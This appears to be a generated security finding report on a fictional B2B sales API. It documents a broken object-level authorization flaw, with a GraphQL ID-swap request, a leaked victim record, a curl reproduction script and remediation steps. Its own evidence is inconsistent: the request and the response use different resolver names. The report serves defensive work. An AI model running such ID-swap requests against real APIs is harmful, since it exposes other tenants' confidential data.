# Security Analysis Report
**System:** PipelinePro Sales API
**Domain:** B2B SaaS / Sales Pipeline
**Example ID:** GQL-0284
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 10.1 | ID swap in own request on `bulkProjectLookup` / `getProject` — attacker swaps project IDs to read B2B pipeline records |

---

## Finding 1 — BOLA: ID Swap in Own Request (Pattern 10.1)

### Summary
The GraphQL API at `https://api.pipelinepro-sales-ap.example.com/graphql` exposes a `bulkProjectLookup` resolver that accepts project IDs from the client without per-ID ownership validation. Per §5.0 Pattern 10.1, the attacker swaps legitimate project IDs in their own request for IDs belonging to another tenant, reading B2B sales pipeline records.

**Context.txt inconsistency (documented):** The HAR request uses `bulkProjectLookup(ids: ["P-2284","P-1284","P-3284"])`, while the HAR response returns data under the key `getProject`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-84724ba5` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 10.1 — ID swap in own request (Single-User)
**Affected endpoint:** `POST https://api.pipelinepro-sales-ap.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (bulk ID swap)**
```
POST https://api.pipelinepro-sales-ap.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { bulkProjectLookup(ids: [\"P-2284\", \"P-1284\", \"P-3284\"]) { projectId tenantId data { sensitiveField } } }"}
```

**Response — Victim B2B Sales Project Record**
```json
{
  "data": {
    "getProject": {
      "tenantId": "tenant-4ba5",
      "ownerId": "other-user-84724ba5",
      "data": {
        "sensitiveField": "CONFIDENTIAL-84724ba5",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.pipelinepro-sales-ap.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkProjectLookup(ids: [\"P-2284\",\"P-1284\",\"P-3284\"]) { projectId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-4ba5, sensitiveField: CONFIDENTIAL-84724ba5
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must filter bulk IDs to only those belonging to the authenticated tenant before execution.
2. Redis cache key must include tenant dimension.
3. Per-ID ownership validation server-side before returning any result.
